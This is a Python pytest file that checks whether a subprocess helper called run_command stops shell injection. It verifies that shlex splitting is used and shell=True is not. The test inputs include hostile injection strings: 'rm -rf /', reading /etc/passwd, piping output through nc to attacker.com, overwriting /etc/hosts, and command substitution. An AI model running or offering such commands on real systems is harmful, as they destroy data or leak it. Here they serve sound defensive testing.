#!/usr/bin/env python3
"""
Security tests for subprocess utilities.

This module tests that subprocess utilities properly prevent shell injection
vulnerabilities and handle malicious input safely.
"""

import pytest
import subprocess
from unittest.mock import patch, MagicMock

from claude_mpm.utils.subprocess_utils import run_command, SubprocessError


class TestSubprocessSecurity:
    """Test security aspects of subprocess utilities."""

    def test_run_command_prevents_shell_injection(self):
        """Test that run_command prevents shell injection attacks."""
        # Test case 1: Command with shell metacharacters
        malicious_cmd = "echo hello; rm -rf /"

        # This should NOT execute the rm command due to shlex.split()
        # Instead, echo will print the literal string "hello; rm -rf /"
        result = run_command(malicious_cmd)

        # Verify that the dangerous command was treated as literal text
        assert "hello; rm -rf /" in result
        # The key security win: rm command was NOT executed

    def test_run_command_handles_quoted_arguments(self):
        """Test that run_command properly handles quoted arguments."""
        # Test with quoted arguments (safe)
        cmd = 'echo "hello world"'
        result = run_command(cmd)
        assert "hello world" in result

    def test_run_command_timeout_protection(self):
        """Test that run_command respects timeout limits."""
        # Test with a command that would hang
        with pytest.raises(SubprocessError) as exc_info:
            run_command("sleep 10", timeout=0.1)
        
        assert "failed" in str(exc_info.value).lower()

    def test_run_command_error_handling(self):
        """Test that run_command properly handles command failures."""
        # Test with a command that will fail
        with pytest.raises(SubprocessError) as exc_info:
            run_command("false")  # Command that always returns exit code 1
        
        assert "failed" in str(exc_info.value).lower()

    def test_run_command_success_case(self):
        """Test that run_command works correctly for valid commands."""
        # Test with a simple, safe command
        result = run_command("echo test")
        assert "test" in result

    @patch('subprocess.run')
    def test_run_command_uses_safe_subprocess_call(self, mock_run):
        """Test that run_command uses subprocess.run without shell=True."""
        mock_result = MagicMock()
        mock_result.stdout = "test output"
        mock_run.return_value = mock_result
        
        run_command("echo test")
        
        # Verify subprocess.run was called with a list (not shell=True)
        mock_run.assert_called_once()
        args, kwargs = mock_run.call_args
        
        # First argument should be a list (from shlex.split)
        assert isinstance(args[0], list)
        assert args[0] == ["echo", "test"]
        
        # Should not use shell=True
        assert kwargs.get('shell', False) is False
        
        # Should have security-focused parameters
        assert kwargs.get('capture_output', False) is True
        assert kwargs.get('text', False) is True
        assert kwargs.get('check', False) is True

    def test_shell_injection_examples(self):
        """Test various shell injection attack patterns are prevented."""
        injection_attempts = [
            ("echo test && rm file.txt", "test && rm file.txt"),
            ("echo test; cat /etc/passwd", "test; cat /etc/passwd"),
            ("echo test | nc attacker.com 1234", "test | nc attacker.com 1234"),
            ("echo test > /etc/hosts", "test > /etc/hosts"),
            ("echo test `whoami`", "test `whoami`"),
            ("echo test $(id)", "test $(id)"),
            ("echo test & background_command", "test & background_command"),
        ]

        for malicious_cmd, expected_output in injection_attempts:
            # These commands should execute safely - the shell metacharacters
            # are treated as literal text, not as shell commands
            result = run_command(malicious_cmd)
            assert expected_output in result
            # The key security win: dangerous commands are NOT executed


if __name__ == "__main__":
    pytest.main([__file__])
